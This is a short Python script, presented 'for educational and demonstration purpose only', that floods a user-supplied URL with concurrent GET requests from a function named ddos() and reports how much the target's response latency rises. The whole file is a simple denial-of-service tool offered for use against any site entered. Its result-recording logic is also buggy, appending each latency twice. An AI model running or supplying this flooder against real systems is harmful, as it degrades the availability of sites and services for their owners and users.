# For educational and demonstration purpose only

import requests, json, threading
from time import sleep

with open("result.json", "w+") as file:
  json.dump([], file)

i = 0
url = "http://"+input('URL: http://')
thread_count = int(input('Thread count: '))
print()
result = []

def record(value):
  result.append(value)
  if len(result) == thread_count:
    with open("result.json", "w") as file:
      json.dump(result, file)

def resulty(stype):
  with open("result.json", "r") as file:
    data = json.load(file)
  if stype == 0:
    return data[0]
  elif stype == 1:
    return data[-1]
  elif stype == 2:
    diff = str(int(data[-1].strip("ms"))-int(data[0].strip("ms")))+"ms"
    return diff

def ddos():
  global i
  global result
  r = requests.get(url)
  if r.status_code == 200:
    i += 1
    print("#"+str(i), str(int(r.elapsed.total_seconds()*1000))+"ms")
  result.append(str(int(r.elapsed.total_seconds()*1000))+"ms")
  record(result[-1])

threads = []

for a in range(thread_count):
  threads.append(threading.Thread(target=ddos))
  threads[a].start()

sleep(3)

print()
print("Done")
print("Threads:",i)
print("Initial Latency:",resulty(0))
print("Last Latency:",resulty(1))
print("Affected Latency:",resulty(2))
